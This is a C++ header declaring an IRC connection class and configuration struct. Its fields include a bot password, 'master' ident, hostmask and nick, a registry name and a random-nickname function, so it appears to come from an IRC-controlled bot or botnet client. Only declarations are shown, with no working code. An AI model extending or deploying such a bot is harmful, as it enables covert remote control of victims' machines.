// CConnectIRC class
#include "Include.h"
#include "CThread.h"

struct cConfig {
	string cNick;
	string cServer;
	unsigned int cPort;
	unsigned int cHttpdPort;
	string cChan;
	string cChanPass;
	string cBotPass;
	string cMasterIdent;
	string cMasterHostmask;
	string cMasterNick;
	string cFileName;
	string cRegName;
	string cRealNick;
};

class CConnectIRC : public CThread
{
public:
	virtual void *Run(void);
	bool ConnectServer();
	bool StillConnected(void);	
	void Disconnect(void);
	unsigned long ResolveAddress(string server);
	bool ReceiveIRCBuffer(void);
	void SendData(const char* vBuffer,...);
	vector <string> ParseIRCBuffer(string vBuffer, string type);
	void Init(void);
	bool IRCRunning;
	bool noReconnect;
	string RndNick(string vPrefix);

	cConfig cConf;

	SOCKET vSocket;

};